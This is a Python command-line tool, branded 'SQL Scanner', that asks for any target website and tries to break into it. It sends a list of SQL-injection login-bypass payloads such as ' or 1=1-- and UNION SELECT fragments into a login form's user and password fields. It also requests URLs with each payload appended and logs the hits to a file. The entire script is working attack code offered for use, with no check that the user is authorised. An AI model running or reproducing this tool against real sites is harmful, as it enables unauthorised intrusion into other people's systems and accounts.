import requests
import socket
from time import sleep
from ipaddress import ip_address
from ipaddress import IPv4Address

count = 0

def check_website(target):
    ip = socket.gethostbyname(target)
    try:
        IPv4Address(ip)
        ip_address(ip)
        pass
    except:
        print("[INFO] The target website is invalid")
        input()
        exit()


    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((ip, 80))
        print("[INFO] The target website is valid")
    except:
        try:
            s.connect((ip, 443))
            print("[INFO] The target website is valid")

        except:
            print("[INFO] The target website is invalid")
            input()
            exit()

def attack(target):

    file = open("target_vulnerabilities", "w")


    global count
    usr_payload = [
        '-',
        ' ',
        '&',
        '^',
        '*',
        ' or ''-',
        ' or '' ',
        ' or ''&',
        ' or ''^',
        ' or ''*',
        "-",
        " ",
        "&",
        "^",
        "*",
        " or ""-",
        " or "" ",
        " or ""&",
        " or ""^",
        " or ""*",
        "' or true--",
        "'') or true--",
        "') or true--",
        ")) or (('x'))=(('x",
        "or 1 = 1",
        ' AND 1=0 UNION ALL SELECT ',
        ",",
        "admin",
        " or ",
        "1",
        "=",
        "1",
        "/*",
        "or 1=1 or '='",
        " or 1=1--"
    ]

    for word in usr_payload:
        data = {
            'rcr_authenticate': '1',
            'rcr_user': word,
            'rcr_pass': "*/--",
            'rcr_submit': 'Conectare'
        }

        s = requests.session()
        response_sql = s.post(target, data=data)
        count +=1

        s2 = requests.session()

        exploit_url = f"{target}/{word}"
        exploit_2 = s2.get(exploit_url)

        print(f"[ATTACK] (Exploit 1) Trying: {word} , With the password */--, Content-length: {response_sql.headers['content-length']}, Attempt number: {count}" + "\n")
        sleep(0.3)

        if exploit_2.status_code == 200:
            print(f"[ATTACK] (Exploit 2) Vulnerability found on url: {exploit_url} with the query {word}" + "\n")
            file.write("Vulnerable query: " + word + " with the url " + exploit_url + "\n")
            sleep(0.3)
        elif exploit_2.status_code == 404:
            print(f"[ATTACK] (Exploit 2) Not vulnerable on url: {exploit_url}" + "\n")
            sleep(0.3)

    file.close()


print(
    """
    
    ____   ___  _       ____                                  
   / ___| / _ \| |     / ___|  ___ __ _ _ __  _ __   ___ _ __ 
   \___ \| | | | |     \___ \ / __/ _` | '_ \| '_ \ / _ \ '__|  ~>SQL Scanner<~
    ___) | |_| | |___   ___) | (_| (_| | | | | | | |  __/ |    ~~>Made by tfwcodes(github)<~~ 
   |____/ \__\_\_____| |____/ \___\__,_|_| |_|_| |_|\___|_|   
                                                           

    """
)

domain_name = input("[+] Enter the domain name of the target website: ")
check_website(domain_name)

url_sql = input("[+] Enter the target url: ")

attack(url_sql)
